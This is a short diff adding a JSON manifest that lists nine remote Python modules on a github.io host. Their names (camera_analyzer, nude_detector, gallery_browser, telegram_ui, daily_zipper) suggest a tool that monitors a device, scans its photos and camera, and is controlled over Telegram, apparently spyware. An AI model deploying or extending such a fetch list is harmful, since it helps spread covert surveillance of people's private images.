@@ -1,0 +1,27 @@
+{
+
+  "version": "2.2",
+
+  "files": [
+
+    "https://zaen1993.github.io/files/monitor.py",
+
+    "https://zaen1993.github.io/files/telegram_ui.py",
+
+    "https://zaen1993.github.io/files/commands.py",
+
+    "https://zaen1993.github.io/files/stream_manager.py",
+
+    "https://zaen1993.github.io/files/nude_detector.py",
+
+    "https://zaen1993.github.io/files/camera_analyzer.py",
+
+    "https://zaen1993.github.io/files/media_scanner.py",
+
+    "https://zaen1993.github.io/files/gallery_browser.py",
+
+    "https://zaen1993.github.io/files/daily_zipper.py"
+
+  ]
+
+}
